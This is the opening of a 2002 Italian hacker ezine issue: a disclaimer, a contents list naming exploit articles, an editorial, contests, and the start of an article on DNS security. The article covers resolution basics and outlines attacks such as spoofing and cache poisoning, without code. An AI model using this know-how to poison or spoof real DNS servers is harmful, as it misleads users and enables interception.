---
title: "oq08"
ezine: "ondaquadra"
---

# oq08

**Ezine:** ondaquadra

<div className="ascii-content">

```
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
::::::::::::,          .::::::::::::::::::::::::::::::,.  .,:::,,.........,:
::::::::,.    s@@@@@@#.  .:::::,        .,:::::::::.   ,:.   ,, :::::::::,.:
::::::,   ;@@@@@@@@@@@@@:  ,::   ;H@@Ar   .::::::.  :@@@@@@:  :.  ;@@@@@#r : 
:::::.  2@@@     :@@@@@@@H .:, @@@@@@@@@@: .::::  ,@@@r  @@@G . S@@@:  @@@S: 
::::  s@@@2  ,,,   #@@@@@@r :,:@@@@@@@@@@@; ,::. 2@@#    :@@# .:@@@   .@@@::
:::, A@@@@  :::::,  @@@@@@@ :,    #@@@@@@@@  :: .@@@  ,. 9@@M   S@@G,3@@r  : 
:::  @@@@@  ,:::::. 5@@@@@2 :::, S@@@@@@@@@: ,:.#@@: ,,  @@@:  ,@@@#B@@@,  : 
::: i@@@@@G  ,::::. r@@@@r .:::  @@@@@@@@@@@  , @@@  :  i@@A  @@@;    @@@3 : 
::: i@@@@@@A        @@@@  .::,  h@@@@@@@@@@@;   @@H    i@@#  @@@;    ;@@@: ,
:::  @@@@@@@@@3;.i@@@S   ,::.  r@@@@@@@@@@@@@@H @@@   A@@3   @@@i   @@@@  ,:
:::, .@@@@@@@@@@@@@:   ,::,   @@@@@@@@@@@@@@@@@@ @@@@@@3   ,  A@@@@@@M   ,::
::::,   9@@@@@@i    .:::::  @@@@@@@@@@@@@@@@@@@@@@@S  ,:::::::::::::::::::::
:::::,.            .,::::, &@@@@@@@@@@@@@@@@@@@@@@@@H  .::::::::::::::::::::
::::::::.              ,:. @@@@@@@@@@@@@@@@@@@@@@@@@@@;  ,::::::::::::::::::
:::::,   :@@@@@@@@@@@;  .. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@  .:::::::::::::::::
:::,   M@@s   ,@@@@@@@@2 . @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@r .::::::::::::::::
::.  @@@#  ..    @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; ,:::::::::::::::
:, ,@@@@  :::::.  @@@@@@i ,  &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  :::::::::::::::
:  @@@@2 ,::::::. r@@@@@r :,   G@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ,::::::::::::::
: S@@@@A  :::::::  @@@@@ .:::.  @@@@@@@@@@@@@@@@@@@@@@@@@H,A,,::::::::::::::
: H@@@@@;   ,,,,  5@@@H  ,::::  @@@@@@@@@@@@@@@@@@@@@@@@@@S  ,::::::::::::::
: S@@@@@@@.      H@@#   ,:::::. @@@@@@@@@@@@@@@@@@@@@@@@@@@. :::::::::::::::
:. #@@@@@@@@@@@@@@&   ,:::::::, @@@@@@@@@@@@@@@@@@@@@@@@@@@2 :::::::::::::::
:,   &@@@@@@@@@H    ,:::::,.    M@@r2@@:@@@@@@@@@@@@@@@@@@@; :::::::::::::::
:::,       A@:        .,,,.2&22@@@@,    A@@@@@@@@@@@@@@@@@@  :::::::::::::::
:::, .s@@@@@@@@@@@@A:      s2@@@HA@@2B@M@@ A@@@@@@@@@@@@@@@  .::::::::::::::
:::,;@@@@@@@@@@@@@@@@@@@@h,             ;@@@rs@@@@@@@@@@@@@@  .:::::::::::::
:::,         ,3@@@@@@@@@@@@@@@@2.            .@@@@@@@@@@@@@@@G :::::,.   ,::
:::::::::,,.      r@@@@@@@@@@@@@@@@@h;         ,S#@@@@@@@@@@@r ,.     2@3,::
:::::::::::::::,.      ;#@@@@@@@@@@@@@@@@@i.        &@@@@@@;     :H@@@@S ,::
::::::::::::::::::::,.      .5@@@@@@@@@@@@@@@@@@Ai:        :@@@@@@@;    ,:::
:::::::::::::::::::::::::,.        :G@@@@@@@@@@@@@@@@@@@@@@@@A:     .,::::::
:::::::::::::::::::::::::::::::,.             ...              .,,::::::::::
::::::::::::::::::::::::::::::::::::::,,..             ..,,:::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

+--------------------------------------------------------------------------+
| ONDAQUADRA                                              #08 - 01/11/2002 | 
+--------------------------------------------------------------------------+
|                         Tutto nel ciberspazio                            |
|                      E' scandito dalla squarewave                        |
|                          Dei micro-processori                            |
|                           Il clock dei micro                             |
|                                 E' come                                  |
|                           Un battito cardiaco                            | 
|                               Elettronico...                             |
+--------------------------------------------------------------------------+
|                        http://www.ondaquadra.org                         |
|              mail@ondaquadra.org ~ articoli@ondaquadra.org               |
+--------------------------------------------------------------------------+

<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-->

+--------------------------------------------------------------------------+
| LEGAL DISCLAIMER                                                         |
+--------------------------------------------------------------------------+
|                                                                          |
| Nessuna persona dello staff di OndaQuadra si assume responsibilita'      |
| per l'uso improprio dell'utilizzo dei testi e dei programmi presenti     |
| nella e-zine, ne' per danni a terzi derivanti da esso.                   |
| OndaQuadra non contravviene in alcun modo alle aggiunte/modificazioni    |
| effettuate con la legge  23 dicembre 1993, n.547 ed in particolare       |
| agli artt. 615-quater- e 615-quinques-.                                  |
| Lo scopo di OndaQuadra e' solo quello di spiegare quali sono e come      |
| avvengono le tecniche di intrusione al fine di far comprendere come      |
| sia possibile difendersi da esse, rendere piu' sicura la propria box e   |
| in generale approfondire le proprie conoscenze in campo informatico.     |
| I programmi allegati sono semplici esempi di programmazione che hanno    |
| il solo scopo di permettere una migliore comprensione di quanto          |
| discusso e spiegato nei testi.                                           |
| Non e' soggetta peraltro agli obblighi imposti dalla legge 7 marzo 2001, |
| n. 62 in quanto non diffusa al pubblico con "periodicita' regolare" ex   |
| art. 1 e pertanto non inclusa nella previsione  dell'art.5 della legge   |
| 8 febbraio 1948, n.47.                                                   |
|                                                                          |
+--------------------------------------------------------------------------+

<--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-->

+--------------------------------------------------------------------------+
| COSTITUZIONE DELLA REPUBBLICA ITALIANA                                   |
+--------------------------------------------------------------------------+
| Diritti e doveri dei cittadini: Rapporti civili                          |
|                                                                          |
| Articolo 21                                                              |
| Tutti hanno diritto di manifestare liberamente il proprio pensiero       |
| con la parola, lo scritto e ogni altro mezzo di diffusione. [...]        |
+--------------------------------------------------------------------------+

<--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-->

+--------------------------------------------------------------------------+
| INDICE                                                                   |
+--------------------------------------------------------------------------+
| [L0GiN]                                                                  |
| 0x01 ViSi0NARi .............................................. [oq~staff] |
| 0x02 iPSE DiXiT ............................................... [JEYoNE] |
| 0x03 On the sunny side of the street ........................ [arkanoid] |
| 0x04 0Q C0NTEST ............................................. [oq~staff] |
+--------------------------------------------------------------------------+
| [HACKiNG]                                                                |
| 0x05 DEFEATiNG DNS ........................................... [SNHYPER] |
| 0x06 iP R0UTiNG ATTACK .......................................... [eazy] |
| 0x07 C0DE iNJECTi0N ............................................. [eazy] |
+--------------------------------------------------------------------------+
| [NETW0RKiNG]                                                             |
| 0x08 iMP0STARE iL DUAL STACK IPV6 / IPV4 ............... [Master^Shadow] |
+--------------------------------------------------------------------------+
| [LiNUX]                                                                  |
| 0x09 LMSRK ..................................................... [spyro] |
+--------------------------------------------------------------------------+
| [C0DiNG]                                                                 |
| 0x0A iNTR0DUZi0NE A PHP .................................... [Lethalman] |
| 0x0B iL SUCCESS0RE Di XSL .................................. [cyberdude] |
| 0x0C PLUS #2 .................................................. [Mastro] |
| 0x0D iMPARiAM0 iL LiNGUAGGi0 WML ........................... [cyberdude] |
| 0x0E GUiDA ALLA PR0GRAMMAZi0NE GRAFiCA iN C/C++ ................ [bondo] |
+--------------------------------------------------------------------------+
| [L'ANG0L0 DEGLi EXPL0iT]                                                 |
| 0x0F BNBF0RM: USi E ABUSi ...................................... [spyro] |
| 0x10 LA G0CCiA CHE FA TRAB0CCARE iL BUFFER ....................... [e4m] |
+--------------------------------------------------------------------------+
| [MiSC]                                                                   |
| 0x11 DiGiTAL ................................................. [evilcry] |
| 0x12 CiRCUiTi STAMPATi ....................................... [TiN_MaN] |
| 0x13 E ULTiM0 VENNE iL P0RC0 ................................ [onnivora] |
| 0x14 GLi SPYWARE 0GGi ........................................... [SwiT] |
+--------------------------------------------------------------------------+
| [L'APPRENDiSTA STREG0NE]                                                 |
| 0x15 GUARDA GUARDA CHE Ti LEGG0 iL W0RD! ...................... [Dagart] |
| 0x16 PATCHARE UN SERiAL NUMBER USAND0 WDASM32 .............. [cyberdude] |
| 0x17 0VERCL0CK ESTREM0 Di UN PENTiUM IV 1600 ..................... [DJK] |
| 0x18 C0DiCE iNVERS0 PARTE 5 ..................................... [Zer0] |
+--------------------------------------------------------------------------+
| [SHUTD0WN]                                                               |
| 0x19 MEDiTAZi0Ni DAVANTi AD UNA MACCHiNETTA ................ [Dreadnaut] |
+--------------------------------------------------------------------------+
| [C0NTATTi]                                                               |
| 0x1A D0VE TR0VARCi ........................................ [oq ~ staff] |
+--------------------------------------------------------------------------+
| [ALLEGATi]                                                               |
| 0x01 MODELLO.JPG ............................................ [oq~staff] |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L0GiN                                      #08 - 01/11/2002 |
| ViSi0NARi                                           [oq~staff] 0x01/0x1A |
+--------------------------------------------------------------------------+
| "Siamo realisti, esigiamo l'impossibile"                                 |
| [Che Guevara]                                                            |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L0GiN                                      #08 - 01/11/2002 |
| iPSE DiXiT                                            [JEYoNE] 0x02/0x1A |
+--------------------------------------------------------------------------+
| "Linux e' troppo vecchio per supportare la tecnologia ADSL"              |
| [un tecnico del 187]                                                     |
|                                                                          |
| "...jey, fai assaggiare un po della tua banana alla mia ragazza..."      |
| [SHNYPER a JEYoNE in un locale di milano]                                |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L0GiN                                      #08 - 01/11/2002 |
| On the sunny side of the street                     [arkanoid] 0x03/0x1A |
+--------------------------------------------------------------------------+
| Abbandonare la citta' la sera e' difficile. Si ha le netta percezione    |
| del sovradimensionamento del traffico rispetto all'infrastruttura della  |
| rete stradale. E' come fare streaming video con un modem da 14 e 4, un   |
| Denial of Service urbano quotidiano.                                     |
| A proposito di DoS (anzi DDoS): lo scorso mese abbiamo assistito a       |
| quello che l'Fbi ha definito il piu' vasto attacco contro Internet,      |
| l'assalto ai root-server dns. Nulla di nuovo sotto il sole cablato;      |
| pero' prima o poi l'inevitabile accadra', ci sara' sicuramente un        |
| attacco devastante contro la rete, primo atto della cyberwar, l'11       |
| settembre elettronico. Sediamoci sulla riva del fiume e aspettiamo che   |
| il cadavere della modernita' ci passi davanti agli occhi, anche se ai    |
| professorini col cappello nero non importa nulla, l'importante e' farsi  |
| accettare nel salotto buono del capitalismo o parlare a qualche inutile  |
| conferenza: i bottegai della sikurezze sono serviti.                     |
|                                                                          |
| Intanto qui si parla di censura. No, questa volta i simpatici signori    |
| del Palazzo non centrano. Anzi, devo dire che ultimamente a              |
| Montecitorio si stanno comportando assai bene; pensate che ieri si sono  |
| addirittura presi a pugni due rappresentsnti dello stesso partito,       |
| cosi' evitano la fatica ai cittadini...                                  |
| Dicevo della censura, anzi auto-cesnura. Ebbene si, abbiamo dovuto       |
| censurare un articolo. Ma come ? Proprio noi, la "stampa clandestina",   |
| i paladini assoluti della liberta' di espressione, super m3g4 l33t del   |
| panorama hackeresco Globale...                                           |
| Comunque state tranquilli, l'articolo incriminato apparira' sul          |
| prossimo numero: restate sintonizzati, il mistero sara' svelato (o       |
| no ? ).                                                                  |
|                                                                          |
| Continuano ad arrivare tanti articoli, alcuni buoni altri meno.          |
| Chiariamo un punto.                                                      |
| Avete scritto un articolo fantastico, estremamente complesso, dove       |
| viene illustratta una nuova sofisticatissima tecnica? Mandatelo a Bfi    |
| (o a phrack o alla Microsoft, e' uguale) :) Siete aspiranti ethical      |
| hacker, black/grey/white hat ?                                           |
| Ecco, non ci interessate :) Noi cerchiamo i rainbow-hat, la fantasia al  |
| potere, l'arcobaleno dei dilettanti, i coriandoli colorati  portati dal  |
| vento ;).                                                                |
| Quindi scrivete, scrivete: meglio le idee della tecnica. Piu'            |
| editoriali e meno guide di compilazione del kernel :)                    |
| Piu' avventura e meno accademia: perlomeno sappiate cos'e' il Jolly      |
| Roger!                                                                   |
| Bene, ora potete procedere; rovinatevi gli occhi  col nuovo numero di    |
| OQ. Sognate ma soprattutto schiodatevi dalle vostre comode poltrone.     |
| Non vogliamo eroi, ma gente che e' stufa di patire in silenzio. No ai    |
| professorini col cappello nero esperti di sikurezza ed estremamente      |
| ipocriti;avanti ai sognatori a 360 gradi, che  avvolgono col la vista    |
| tutto il giro dell'orizzonte onirico.                                    |
|                                                                          |
|  Il nuovo OQ e'vostro: fate in modo che il prossimo numero sia migliore. | 
|                                                                          |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L0GiN                                      #08 - 01/11/2002 |
| 0Q C0NTEST                                          [oq~staff] 0x04/0x1A |
+--------------------------------------------------------------------------+
|                                                                          |
| Il nuovo numero di Ondaquadra porta con se una sferzata di novitα, prima | 
| tra tutte questa nuova sezione denominata contest.                       |
| Lo scopo di questa sezione Φ quello di fornire un mezzo ai nostri        |
| lettori per interagire sempre pi∙ da vicino nel processo di maturazione  |
| della zine fornendo contributi volti a migliorarne gli aspetti pi∙       |
| disparati.                                                               |
| Ad ogni nuovo numero di OQ verranno istituiti uno o pi∙ contest          |
| riguardanti tematiche diverse (programmazione, grafica, etc), ad ognuno  |
| di essi sarα possibile partecipare liberamente. Ogni contest avrα una    |
| consegna ben precisa da rispettare sulla base della quale verranno       |
| valutati i vostri lavori.                                                |
| L'oggetto dei contest sarα scelto in maniera tale che il lavoro che si   |
| aggiudicherα il primo posto potrα venire impiegato per migliorare quello | 
| che Φ il nostro e il vostro progetto: Ondaquadra.                        |
| I tempi di consegna dei vostri progetti coincideranno molto spesso con   |
| l'uscita del prossimo numero di OQ tuttavia potranno essere estesi a     |
| seconda della quantitα di contributi ricevuti, il countdown visibile in  |
| homepage risulterα utile per avere un'idea del tempo a propria           |
| disposizione.                                                            |
|                                                                          |
| Ma ora entriamo nel vivo dei contest che Ondaquadra ha deciso di         |
| promuovere questo mese...                                                |
|                                                                          |
| 1. Programmazione                                                        |
|                                                                          |
| Il contest prevede la realizzazione di un impaginatore in grado di       |
| trasformare un testo formattato a piacere in un articolo conforme agli   |
| standard di pubblicazione di OQ, ovvero con una formattazione del testo  |
| a 72 caratteri di larghezza, proprio come l'articolo che state leggendo. | 
| Sono ESCLUSI dai compiti dell'impaginatore la genarazione della cornice  |
| di pipe "|".                                                             |
| E' possibile utilizzare qualsiasi linguaggio di programmazione, tale     |
| scelta Φ stata fatta per lasciare la maggior libertα possibile.          |
| Il codice sarα valutato in base all'aderenza alle consegne, alle scelte  |
| di progetto e all'efficenza.                                             |
| Alcuni suggerimenti: i punti pi∙ critici sono rappresentati dalla        |
| gestione dei possibili disegni ASCII contenuti nel testo, la soluzione   |
| di tale problema costituisce un punto cruciale nella valutazione del     |
| progetto, per tanto le scelte riguardanti tale gestione sono lasciate    |
| interamente all'autore del programma.                                    |
| Il progetto che si aggiudicherα il primo posto costituirα un tool di     |
| pubblica utilitα per tutti gli utenti che vorranno impaginare i propri   |
| articoli in maniera corretta e verrα per tanto inserito tra i download   |
| del nostro sito a disposizione di chiunque voglia usufruirne.            |
| Il progetto dovrα essere inviato a contest@ondaquadra.org entro e non    |
| oltre la data di pubblicazione prevista per il prossimo numero, lo staff | 
| si riserva tuttavia la possibilitα di estendere la validitα del contest  |
| sulla base dei contributi ricevuti.                                      |
|                                                                          |
| 2. Grafica                                                               |
|                                                                          |
| Il contest consiste nel progettare la grafica delle t-shirt di           |
| Ondaquadra, la sola consegna da rispettare Φ quella di utilizzare un     |
| logo piccolo per quanto riguarda la parte davanti della t-shirt e uno    |
| pi∙ grande nella parte posteriore, ai partecipanti Φ lasciata piena      |
| autonomia per quanto riguarda le scelte puramente stilistiche.           |
| In allegato alla zine e sul nostro sito Φ possibile reperire la jpg che  |
| costituisce il modello su cui dovrα essere presentato il vostro lavoro.  |
| Sulla base del progetto vincitore saranno stampate delle magliette a     |
| disposizione dello staff e dei lettori che ne dovessero fare richiesta.  |
| Il progetto dovrα essere inviato a contest@ondaquadra.org entro e non    |
| oltre la data di pubblicazione prevista per il prossimo numero, lo staff | 
| si riserva tuttavia la possibilitα di estendere la validitα del contest  |
| sulla base dei contributi ricevuti.                                      |
|                                                                          |
| 3. Web                                                                   |
|                                                                          |
| Il contest vede come oggetto la versione testuale del sito di OQ ed Φ    |
| dedicato a chiunque voglia cimentarsi nella realizzazione di un sito     |
| ottimizzato per links/lynx o altri browser testuali.                     |
| Nella realizzazione di tale sito vi sono tuttavia delle consegne da      |
| rispettare, in particolare deve comparire almeno una volta la frase:     |
|                                                                          |
| "Fino a quando lo spirito umano sara' vivo, gli hackers esisteranno      |
| sempre. Puo' darsi che dovremo combattere una battaglia durissima se     |
| continueremo ad essere imprigionati e vittimizzati a causa del nostro    |
| desiderio di esplorare. Ma questa repressione raggiungera' tutti gli     |
| obiettivi tranne quello di fermarci"                                     |
| E. Goldstein, editore di 2600                                            |
|                                                                          |
| Una parte dello spazio dovrα essere dedicata ai link che permettono di   |
| effettuare il download dei numeri nuovi e arretrati di Ondaquadra.       |
| Devono comparire i seguenti indirizzi e-mail al fine di permettere il    |
| recapito degli articoli da parte degli utenti e per contattare la        |
| redazione:                                                               |
|                                                                          |
| articoli@ondaquadra.org                                                  |
| mail@ondaquadra.org                                                      |
|                                                                          |
| Il sito che si aggiudicherα il primo posto sarα il candidato a           |
| sostituire il sito attuale che si trova all'URL:                         |
|                                                                          |
| http://www.autistici.org/ondaquadra/indexlynx.html                       |
|                                                                          |
| Il progetto dovrα essere inviato a contest@ondaquadra.org entro e non    |
| oltre la data di pubblicazione prevista per il prossimo numero, lo staff | 
| si riserva tuttavia la possibilitα di estendere la validitα del contest  |
| sulla base dei contributi ricevuti, penso che ormai la formula la        |
| conosciate :)                                                            |
|                                                                          |
| Bene, con questo ho finito! Vi saluto e vi invito a partecipare numerosi | 
| in attesa dei contest che vi proporremo nel prossimo numero.             |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ HACKiNG                                    #08 - 01/11/2002 |
| DEFEATiNG DNS                                        [SNHYPER] 0x05/0x1A |
+--------------------------------------------------------------------------+
|  ovvero: Tutto cio' che volevate sapere sui DNS e non avete mai          |
|          osato chiedere                                                  |
|                                                                          |
|                  [snhyper@Charlotte2:~]$  date                           |
|                  Sun Oct 06 03:58:05 CEST 2002                           |
|                                                                          |
|                     -snhyper@ondaquadra.org-                             |
|                    --http://snhyper.owns.it--                            |
|                                                                          |
|                                                                          |
|                                                                          |
|  0x00 => Indice:                                                         |
|                                                                          |
|                                                                          |
|                                                                          |
|  0x00) Indice                                                            |
|                                                                          |
|  0x01) Requisiti                                                         |
|                                                                          |
|  0x02) Introduzione generale                                             |
|                                                                          |
|  0x03) Introduzione al DNS                                               |
|   -sub_A() Non-authoritative answer                                      |
|   -sub_B() Recursive resolution                                          |
|   -sub_C() Iterative resolution                                          |
|                                                                          |
|  0x04) Costituzione pacchetti DNS                                        |
|                                                                          |
|  0x05) Parametri DNS                                                     |
|                                                                          |
|  0x06) Analisi tipologica di attacchi ai server DNS                      |
|   -sub_A() DNS  footprinting                                             |
|   -sub_B() DNS  zone transfer                                            |
|   -sub_C() DNS  Denial of Service                                        |
|   -sub_D() DNS  ID guessing                                              |
|   -sub_E() DNS  spoofing                                                 |
|   -sub_F() DNS  poisoning/caching                                        |
|   -sub_G() DDNS update spoofing                                          |
|                                                                          |
|  0x07) Protezione server DNS                                             |
|   -sub_A() Macchine posix (*nix, *BSD)                                   |
|   -sub_B() Macchine Win                                                  |
|                                                                          |
|  0x08) Progetto AmPaRo                                                   |
|                                                                          |
|  0x09) Greetings and Byez                                                |
|                                                                          |
|  0x0A) Resources                                                         |
|                                                                          |
|  0x0B) GPG Key                                                           |
|                                                                          |
|                                                                          |
|  0x01 => Requisiti:                                                      |
|                                                                          |
|  - conoscenza protocollo tcp/ip - iso/osi                                |
|  - conoscenza funzionamento protocollo dns e cio' ad esso correlato      |
|  - conoscenza linguaggio C (se non ci si vuole limitare ad eseguire)     |
|  - conoscenza programmazione socket raw (idem come sopra)                |
|  - importante: eseguire-> #mount /dev/brain /mnt/head                    |
|                                                                          |
|                                                                          |
|                                                                          |
|  0x02 => Introduzione generale:                                          |
|                                                                          |
|  In questo paragrafo illustrero' a grandi linee le caratteristiche dei   |
|  dns senza entrare nei particolari e senza approfondire la sua           |
|  struttura e il suo funzionamento in quanto dovrebbe essere un target    |
|  gia' sviluppato (come da paragrafo "Requisiti") ai fini di una          |
|  ottimale comprensione del presente documento. Per informazioni su       |
|  tutto cio' che viene detto, tecniche o no, e per approfondimenti vari   |
|  vi rimando all'ultimo paragrafo "Risorse" nel quale potete trovare      |
|  puntatori a tutto cio' che mi ha permesso di capire e di sviluppare, e  |
|  che sarebbe ottimo sapere prima di addentrarsi nei meandri specifici    |
|  delle reti e dell'hacking in generale.                                  |
|  Nel seguito del paper verranno sviluppati anche altri temi inerenti di  |
|  cui potete trovare traccia nell'indice sopra esposto.                   |
|                                                                          |
|  C00L: Questo testo vuole essere una analisi dell'argomento DNS          |
|        security per tutti coloro (sysadmin - h4x0r etc..) che vogliono   |
|        proteggersi - imparare - etc.. con queste metodologie che         |
|        ritengo molto interessanti.                                       |
|        Come disse mudge in un suo source in un commento:                 |
|        /* A little step for a man, a big step for human kind */          |
|                                                                          |
|        Questo testo vuole essere anche una "implementazione" e           |
|        "chiarificazione" del testo "DNS Sp00f attack" dell'amico E4zy    |
|        pubblicato su OndaQuadra n.0x06 ,articolo 0x1D.                   |
|                                                                          |
|        Questo testo non vuole essere una incitazione ad attacchi e vari. | 
|                                                                          |
|        Questo testo non vuole sminuire il testo di E4zy o altro.         |
|                                                                          |
|                                                                          |
|                                                                          |
|  0x03 => Introduzione ai DNS:                                            |
|                                                                          |
|  I DNS (Domain Name System) non sono altro che un database distribuito   |
|  e inter-collaborante che permette il "mapping" dei nomi logici di       |
|  dominio FQDN (Full Qualified Domain Name) sugli indirizzi di rete IP    |
|  Address. Questo per una semplificazione notevole all'utenza media e     |
|  non, in quanto e' sicuramente piu' semplice ricordarsi di un nome       |
|  logico rispetto ad un indirizzo fisico. Basta pensare, ad esempio, per  |
|  i computers "internet-connected" quanto sia piu' comodo ricordarsi di   |
|  www.sikurezza.org rispetto a 151.8.1.46;in questo caso il DNS           |
|  effettuera' per noi la risoluzione dell'URL (Universal Resource         |
|  Locator). Altro notevole vantaggio sta nell'evitare la difficile        |
|  manutenzione di grossi file /etc/hosts etc...in grosse organizzazioni.  |
|                                                                          |
|  I nomi logici DNS hanno la forma di "dominio.tipo_dominio", ad esempio  |
|  sikurezza.org (sikurezza non me ne voglia a male se l'ho preso come     |
|  esempio ;). I tipi di dominio sono mantenuti dall'ICANN e tra i piu'    |
|  conosciuti troviamo appunto ".edu - .org - .com - .it - .net" etc..     |
|  che differenziano nella maggior parte dei casi la tipologia di          |
|  contenuti del server o, nel caso dei tipi countries-specific, della     |
|  nazionalita' ove si trova l'organizzazione (".jp - .de - .en - .fr").   |
|                                                                          |
|  Come si sapra' certamente,al top di tutto si trova la root, alla quale  |
|  sono designati i 13 root-servers che mantengono traccia dei "top level  |
|  servers" contenenti informazioni di risoluzione per i domini di primo   |
|  livello TLD (Top Level Domain).                                         |
|                                                                          |
|  Ma ora vediamo a grandi linee il metodo di risoluzione base di un dns:  |
|  Quando un client richiede una connessione ,per esempio con il sito      |
|  www.sikurezza.org, egli non sa che indirizzo abbia quindi effettuera'   |
|  pochi semplici passi che gli permetteranno la sua risoluzione e quindi  |
|  di connettersi.                                                         |
|                                                                          |
|  Nel seguente schema si ravvisera' la tipica metodologia di risoluzione  |
|  per sistemi posix compliant quali linux, unix, *BSD etc.., che quindi   |
|  non includera' la ricerca in database WINS, in file lmhosts etc..       |
|  tipiche dei sistemi windoze.                                            |
|                                                                          |
|  Primo passo sara' controllare se l'host appartiene al dominio locale.   |
|  Una volta appurato che non lo e', controllera' il file /etc/hosts per   |
|  trovare una risoluzione preimpostata dall'utente stesso.                |
|  Non trovando niente inviera' una query al proprio DNS server, trovato   |
|  attraverso un resolver (/etc/resolv.conf), tramite la GetHostByName(3). | 
|  Nel caso in cui il DNS server di default non sia autoritativo per il    |
|  dominio richiesto e non abbia la voce richiesta nella cache, agira' da  |
|  forwarder o inviera' una richiesta ricorsiva (se supportata,flag RA).   |
|                                                                          |
|  L'abilitazione della modalita' ricorsiva e' una prerogativa senza la    |
|  quale il dns-poisoning non puo' essere effettuato (vedremo perche').    |
|  Se il client si vedra' ritornare dal DNS una response non autoritativa  |
|  (non-authoritative response) significhera' che il DNS non ha neanche    |
|  contattato il server autoritativo per quel dominio, ma l'aveva nella    |
|  cache.                                                                  |
|                                                                          |
|  Esempio:                                                                |
|                                                                          |
|  -sub_A() Non-authoritative answer: {                                    |
|                                                                          |
|   client                     dns.tin.it              dns.sikurezza.org   |
|  ----------                  ----------                  ----------      |
|  |        |www.sikurezza.org.|        |                  |        |      |
|  |        -----------------> |        |                  |        |      |
|  |        |     A    ?       |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |www.sikurezza.org.|        |                  |        |      |
|  |        | <----------------         |                  |        |      |
|  |        | A  151.8.1.56    |        |                  |        |      |
|  |        | AA=0x00          |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|                                                                          |
|  In questo caso, essendo la flag AA (Autority answer) impostata a 0      |
|  significa che il server non ha autorita' su quel dominio: vorra'        |
|  quindi dire che dns.tin.it aveva la mappatura nella cache.              |
|  Ricordo che il tempo per il quale la voce deve rimanere attiva nella    |
|  cache equivale a quello impostato nel pacchetto di risposta corrispon-  |
|  dente al campo TTL.                                                     |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_B() Recursive resolution: {                                        |
|                                                                          |
|   client                     dns.tin.it              dns.sikurezza.org   |
|  ----------                  ----------                  ----------      |
|  |        |www.sikurezza.org.|        |www.sikurezza.org.|        |      |
|  |        -----------------> |        -----------------> |        |      |
|  |        |     A    ?       |        |     A   ?        |        |      |
|  |        |                  |        |                  |        |      |
|  |        |www.sikurezza.org.|        |www.sikurezza.org.|        |      |
|  |        | <----------------         | <-----------------        |      |
|  |        | A  151.8.1.56    |        | A  151.8.1.56    |        |      |
|  |        | AA=0x01          |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|                                                                          |
|  In questo caso (il disegno e' molto schematico e ho lasciato le parti   |
|  che descrivero' ora) dns.tin.it contattera' uno dei root-server, il     |
|  quale gli ritornera' l'indirizzo di uno dei server con autorita' sul    |
|  TLD .org; allora dns.libero.it contattera' quest'ultimo chiedendo di    |
|  sikurezza.org e verra' ritornato,ad es.,l'indirizzo di sikurezza.org,   |
|  , che conterra' il record relativo a www.sikurezza.org come record      |
|  A o CNAME a seconda di come e' stato impostato. Il record sara' di tipo | 
|  autoritativo (AA=0x01).                                                 |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_C() Iterative resolution: {                                        |
|                                                                          |
|   client                     dns.tin.it              dns.sikurezza.org   |
|  ----------                  ----------                  ----------      |
|  |        |www.sikurezza.org.|        |                  |        |      |
|  |        -----------------> |        |                  |        |      |
|  |        |     A    ?       |        |                  |        |      |
|  |        |                  |        |                  |        |      |
|  |        |dns.sikurezza.org.|        |                  |        |      |
|  |        | <----------------         |                  |        |      |
|  |        | A  151.8.1.253   |        |                  |        |      |
|  |        | AA=0x00          |        |                  |        |      |
|  |        |                                              |        |      |
|  |        |                                              |        |      |
|  |        |     www.sikurezza.org.  A   ?                |        |      |
|  |        ---------------------------------------------> |        |      |
|  |        |                                              |        |      |
|  |        |      www.sikurezza.org. A   151.8.1.56       |        |      |
|  |        | <---------------------------------------------        |      |
|  |        |       AA=0x01                                |        |      |
|  |        |                                              |        |      |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  Come si puo' notare (anche qui sono stati saltati i passi intermedi)    |
|  nell'interrogazione iterativa e' il client a effettuare le ricerce      |
|  per i fatti suoi secondo le risposte ricevute dai dns intermediari.     |
|  E' quindi facile comprendere (per chi sa le basi del dns-poisoning)     |
|  perche' nel caso di una interrogazione iterativa non sia possibile      |
|  un attacco del genere.                                                  |
|                                                                          |
|  Per capire bene il funzionamento basta armarsi di tools come "dig" o    |
|  "nslookup", o "host" presenti in ogni distro linux, e naturalmente      |
|  del classico tcpdump ("anke medioman usa tcpdump", vero Raoul? ;=).     |
|                                                                          |
|  0x04 => Costituzione pacchetti DNS:                                     |
|          da Tcp/Ip Illustrated vol.1 , W.R.Stevens                       |
|                                                                          |
|                                                                          |
|  Questo paragrafo serve solo da promemoria per la lettura di codice      |
|  e/o la lettura di parti tenciche in quanto la sua conoscenza deve       |
|  essere gia stata approntata!                                            |
|                                                                          |
